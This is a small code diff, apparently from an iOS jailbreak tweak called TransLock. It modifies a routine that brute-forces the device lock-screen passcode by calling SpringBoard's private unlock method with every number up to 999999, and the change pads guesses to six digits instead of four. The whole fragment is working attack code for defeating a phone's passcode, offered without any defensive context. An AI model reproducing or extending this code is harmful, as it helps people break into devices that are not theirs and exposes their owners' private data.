@@ -30,7 +30,7 @@ NSString *numString;
 - (void)bruteforce {
 	for (int i = 0; i <= 999999; i++)
 	{
-		numString = [NSString stringWithFormat:@"%04d", i];
+		numString = [NSString stringWithFormat:@"%06d", i];
 		NSLog(@"Testing : %@", numString);
 		if ([[%c(SBDeviceLockController) sharedController] attemptDeviceUnlockWithPassword:numString appRequested:NO]) {
 			[[[UIAlertView alloc] initWithTitle:@"TransLock" message:[NSString stringWithFormat:@"Password is %@", numString] delegate:nil cancelButtonTitle:@"Dismiss" otherButtonTitles:nil] show];
